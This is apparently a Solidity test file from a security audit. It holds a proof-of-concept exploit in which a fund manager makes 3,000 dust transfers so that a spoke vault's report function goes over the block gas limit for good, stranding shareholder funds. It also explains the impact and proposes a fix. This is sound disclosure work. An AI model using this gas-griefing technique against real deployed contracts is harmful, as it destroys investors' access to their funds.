// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {ISpokeVault} from "../../../src/interfaces/ISpokeVault.sol";
import {FundFactory} from "../../../src/factory/FundFactory.sol";
import {SpokeVault} from "../../../src/spoke/SpokeVault.sol";
import {TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {TransitMessage} from "../../../src/libraries/TransitMessage.sol";
import {Mandate, MandateLib} from "../../../src/mandate/Mandate.sol";
import {AccessFundFixture} from "./AccessFundFixture.sol";

/// @notice Wormhole Core stand-in that only logs the message, like the real Core Bridge (the repository's
///         MockWormholeCore stores every payload in storage, which would overstate the gas of `report()`).
contract LogOnlyWormholeCore {
    uint64 internal _sequence;

    event LogMessagePublished(
        address indexed sender, uint64 sequence, uint32 nonce, bytes payload, uint8 consistencyLevel
    );

    function publishMessage(uint32 nonce, bytes memory payload, uint8 consistencyLevel)
        external
        payable
        returns (uint64 sequence)
    {
        sequence = _sequence++;
        emit LogMessagePublished(msg.sender, sequence, nonce, payload, consistencyLevel);
    }
}

/// @title PoC: a few thousand dust sends home make `report()` exceed the block gas limit, for good
/// @notice ATTACK. `SpokeVault.report()` walks the whole list of hub-bound transits twice: `nextReport` prunes the ones
///         no longer in flight (SpokeCrossChainLib.sol:103-106) and `_build` encodes the ones still in flight
///         (SpokeCrossChainLib.sol:178-187). The list grows by one entry per `sendToHub`, which has no minimum amount
///         and no cap on how many transfers may be in flight (SpokeCrossChainLib.sol:38-58, 293). The ONLY code that
///         shrinks it is that same loop in `report()` (and `recognizeRefund`, one entry at a time, only for a transfer
///         whose Across refund reached its escrow). So the manager sends 2 base units home 3,000 times (about 0.03 ETH
///         of gas on Robinhood Chain at today's price, plus 0.006 USDG) and fills each deposit itself on the hub so
///         that no refund ever comes. From then on `report()` needs more than the 32,000,000 gas a block allows on
///         Arbitrum One and on Robinhood Chain (ArbGasInfo `getGasAccountingParams`, read on 2026-09-30): first
///         because the payload lists 3,000 entries, then, once the 6 h 26 min window has passed, because the prune
///         loop itself no longer fits. It can never run again, so the list can never shrink.
/// @notice IMPACT. Permanent. No value report is ever published for that spoke again: every mint on the hub reverts
///         (`StaleSpokeReport`), Share Assets keep the spoke's last accepted report for ever, and nothing the spoke
///         sends home afterwards is ever listed, so it lands in `unmatchedArrivals` with no recovery (see
///         UnmatchedReturnLeg.t.sol). The value on that spoke is lost to the shareholders. The manager gains nothing;
///         it is a grief, or a compromised or buggy manager key (an agent looping on `sendToHub` does it by accident).
/// @notice FIX. Bound what the manager can make the vault iterate: a minimum amount per send home and a cap on
///         simultaneous hub-bound transits (revert `sendToHub` above it), and prune in bounded steps (a permissionless
///         `prune(maxEntries)`), so a long list can always be shortened. The same applies to the position registry
///         (`openPosition` has no cap and `buildReport` walks every position on every hub valuation).
contract ReportGasBrickPoC is AccessFundFixture {
    /// @dev Per-block and per-transaction gas limit of Arbitrum One and Robinhood Chain.
    uint256 internal constant BLOCK_GAS_LIMIT = 32_000_000;
    uint256 internal constant DUST_SENDS = 3000;

    function test_POC_dustSendsHomeBrickTheSpokeReportForGood() public {
        FundFactory spokeFactory = _spokeFactory();
        bytes32 fundId = spokeFactory.fundIdOf(HUB, 1, manager);
        Mandate memory m = _buildMandate(spokeFactory, fundId, _plan());
        vm.prank(manager);
        IFundFactory.ChainAddresses memory c = spokeFactory.createSpoke(1, m, _spokeParams(MandateLib.hash(m), _plan()));
        SpokeVault spoke = SpokeVault(c.spokeVault);
        vm.etch(address(spokeWormhole), address(new LogOnlyWormholeCore()).code);

        // The fund's principal on the spoke.
        bytes memory message = TransitMessage.encode(fundId, HUB, keccak256("hub transit 1"), TransferKind.Principal);
        usdg.mint(address(spoke), 500_000e6);
        vm.prank(address(spokeAcross));
        spoke.handleV3AcrossMessage(address(usdg), 500_000e6, stranger, message);

        // Control: a report fits a block many times over.
        vm.cool(address(spoke));
        spoke.report{gas: BLOCK_GAS_LIMIT / 10}();
        assertEq(spoke.reportSequence(), 1);

        // The manager: 3,000 sends home of 2 base units each (the loop's own gas is not metered by the test).
        vm.pauseGasMetering();
        vm.startPrank(manager);
        bytes32 firstId = spoke.sendToHub(2, TransferKind.Principal, 0, _quote(2, manager));
        for (uint256 i = 1; i < DUST_SENDS; ++i) {
            spoke.sendToHub(2, TransferKind.Principal, 0, _quote(2, manager));
        }
        vm.stopPrank();
        vm.resumeGasMetering();
        assertEq(spoke.inFlightTransitIds().length, DUST_SENDS);
        assertEq(spoke.cumulativeSentHome(), 2 * DUST_SENDS, "0.006 USDG in total");

        // While they are in flight the report does not fit a block (a fresh transaction: cold storage).
        vm.cool(address(spoke));
        vm.expectRevert();
        spoke.report{gas: BLOCK_GAS_LIMIT}();

        // The manager filled every deposit itself on the hub, so no refund ever reaches an escrow. After the window
        // the entries are no longer encoded, but pruning them is the same loop and it does not fit a block either.
        vm.warp(block.timestamp + 21_600 + MAX_REPORT_AGE + 1);
        vm.cool(address(spoke));
        vm.expectRevert();
        spoke.report{gas: BLOCK_GAS_LIMIT}();

        // Nothing else shortens the list: `recognizeRefund` removes one entry, and only when its refund arrived.
        vm.expectRevert(abi.encodeWithSelector(ISpokeVault.NoRefund.selector, firstId));
        spoke.recognizeRefund(firstId);
        assertEq(spoke.inFlightTransitIds().length, DUST_SENDS, "the list can never shrink");
        assertEq(spoke.reportSequence(), 1, "no report after the first one, ever");
        assertGt(spoke.unallocatedBalance(address(usdg)), 499_980e6, "with the fund's principal still on the spoke");
    }
}
